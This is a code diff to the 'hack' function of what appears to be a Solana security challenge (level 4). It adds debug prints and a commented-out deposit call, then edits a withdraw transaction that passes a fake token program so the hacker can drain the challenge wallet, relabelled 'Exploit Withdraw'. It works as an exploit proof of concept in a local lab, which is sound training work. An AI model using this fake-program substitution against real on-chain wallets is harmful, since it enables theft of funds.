@@ -36,6 +36,31 @@ fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
 
     let fake_token_program = env.deploy_program("target/deploy/level4_poc_contract.so");
 
+    println!("{}", challenge.wallet_address);
+    println!("{}", hacker_wallet);
+    println!("{}", challenge.wallet_owner);
+    println!("{}", challenge.wallet_program);
+    println!("mint {}", challenge.mint);
+    println!("{}", challenge.hacker.pubkey());
+
+    // let tx = env.execute_as_transaction(
+    //     &[Instruction {
+    //         program_id: challenge.wallet_program,
+    //         accounts: vec![
+    //             AccountMeta::new(hacker_wallet, false),
+    //             AccountMeta::new(challenge.wallet_address, false),
+    //             AccountMeta::new_readonly(spl_token::id(), false),
+    //             AccountMeta::new_readonly(challenge.mint, false),
+    //             AccountMeta::new_readonly(fake_token_program, false),
+    //         ],
+    //         data: WalletInstruction::Deposit { amount: 10 }
+    //             .try_to_vec()
+    //             .unwrap(),
+    //     }],
+    //     &[],
+    // );
+    // tx.print_named("Exploit Deposit");
+
     let tx = env.execute_as_transaction(
         &[Instruction {
             program_id: challenge.wallet_program,
@@ -44,7 +69,7 @@ fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
                 AccountMeta::new_readonly(authority_address, false),
                 AccountMeta::new_readonly(challenge.hacker.pubkey(), true),
                 AccountMeta::new(challenge.wallet_address, false),
-                AccountMeta::new_readonly(challenge.mint, false),
+                AccountMeta::new_readonly(spl_token::id(), false),
                 AccountMeta::new_readonly(fake_token_program, false),
             ],
             data: WalletInstruction::Withdraw { amount: 10 }
@@ -53,7 +78,7 @@ fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
         }],
         &[&challenge.hacker],
     );
-    tx.print_named("Do overflow first-time");
+    tx.print_named("Exploit Withdraw");
 }
 
 /*
